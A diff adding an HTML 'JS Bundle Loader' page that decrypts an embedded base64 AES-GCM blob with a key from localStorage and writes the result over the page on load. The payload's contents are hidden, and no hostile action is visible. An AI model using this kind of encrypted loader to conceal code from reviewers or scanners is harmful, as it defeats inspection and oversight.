@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head><title>JS Bundle Loader</title></head>
+<body>
+<script>
+const JS_BUNDLE = "/9raLI9nw1sM0QrAZUuSVP6s2BW5S5Dj//VPhrCrv0bHgP/qLjhJVLxk9AmJ7t/EvJmHHn78+JDaQ2pZMyFJorIHM3FNn2T4QFQs1dSdDb7pRjEWaMl3stAKR/MS7SQSk6AZ6hIdKh1s0cw804MWcVGfoGtXiqixfJkTR6hAwjMP6m3A1f/nD8lyMIKcjv31QoVeeYWL96pKx3vlIcuB4JaVP5B5qzz7VJgVoFlJ/5Ku4ejaqXwlYaTBZIhz02yDDMZhRDZv/Ht/OMTIFa7oPY/6guYDgP/J0wt0X+bgfw/meiOw61KuPj+TSsLKdry2Ryk7SFvWiHtO/kebhI/xIJBtz1TEkxFlRUb/Ib+YKfxDhheshE7zXctikLFS7ibqwxPCgXkfNDdeiq7tgh1E5BJUcKhCYGaeXAQbf2k4qMYQwDdeLbPEcgHOTDncmXcsvAaWQYRr+70icar/r/wqqxXF0UXRZ0iJRgDx2m1RnYHALVnF36r5YwNQf6fAVDWdBH1wW3w08EHzG0poM2fFrCt1xykxQxiJWN5BzLz3wBH7Yk0ep3hXN018vHkS+vFkUR4+ZqJTpLEf2I3Hs6kev+oA28n0wp4HVKb0jJvM1l5A9ffXAcBrijnQa08M5YVDx5GHvcRnBXPMtIk5I/pZsFyATAKozLn9MyPU4Xt98d7lHM/Djhc1gVubDhYurcfX+el1v6lmQYnzgmCXQEmycSoGCc9nzDukHlcnSf7MkTUY0S/fyqxYSKlPWgzjQCDL4F0SejvvHvZnyc2ShIobF0QwpcVvZM4hQJAFGhdYwooDZGIS+YXGY9HG9wfNrm37+9PE44W9qBzIwrRI5VLb8zl7VOui/UNKftOSO59KiDbn9x2vI9ZOvEveTW01GPvJnYjCe5ugfmm1yzsZfxQdbtPETAoxU/ti5XfcaC+8Pu4/7CfAnx1Md63i6pgUKww57VcFBEbu2w9tFbqqZVifsl9ftkBnN6bVbh1HSdOZdPwmsNpZgWcnVw98JKn4Cjh03pWr8h/iwje7y8mmfb3GPj77rjJYdRUEBnN6d2s1Y5oIDCTciqLFiBdmtrop64wMoDJaCO7YE6whnHxVSKuoNeRt6QaZD04eKJcxxHYIOAzUVRSZVvOFBexPtOO1Iw5OR+WHnxnHvJCJIpFZJg0mMsWlnevhfimcI5KkCB7ugdEHK8+1XnfnpROybODyOgVWUtalwzgn0Dfli0B5LB0wq7Ztex6nx0fd3I+HvJJnGY5iu9KJvUVh5+1QfRB8WIJSBmLoloOF6Af7KRfTX7tYjT3tObfISYMydqjQqqpyRKLNAqnCCbJThEJzvBLzbUbseCrczDkBCoysR2Bl91+SxfBcMqVB6LWpiWJsxmrdUQx7F56uWI+Oi96RCXxolA==";
+async function load() {
+  try {
+    const keyHex = (localStorage.enc_key || "").trim();
+    if (!/^[0-9a-fA-F]{64}$/.test(keyHex)) {
+      document.body.innerHTML = '<pre style="color:red">Error: localStorage.enc_key missing or not 64 hex chars.</pre>';
+      return;
+    }
+
+    // Decode base64 → bytes
+    const raw = atob(JS_BUNDLE);
+    const buf = new Uint8Array(raw.length);
+    for (let i = 0; i < raw.length; i++) buf[i] = raw.charCodeAt(i);
+
+    // Split: first 12 bytes = IV, rest = ciphertext
+    const iv = buf.slice(0, 12);
+    const ct = buf.slice(12);
+
+    // Hex key → bytes
+    const keyBytes = new Uint8Array(32);
+    for (let i = 0; i < 32; i++)
+      keyBytes[i] = parseInt(keyHex.substr(i * 2, 2), 16);
+
+    // Decrypt
+    const key = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["decrypt"]);
+    const pt = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, ct);
+    const html = new TextDecoder().decode(pt);
+
+    // Replace entire page with decrypted content
+    document.open();
+    document.write(html);
+    document.close();
+  } catch (e) {
+    document.body.innerHTML = '<pre style="color:red">Decrypt error: ' + e.message + '</pre>';
+  }
+}
+load();
+</script>
+</body>
+</html>   
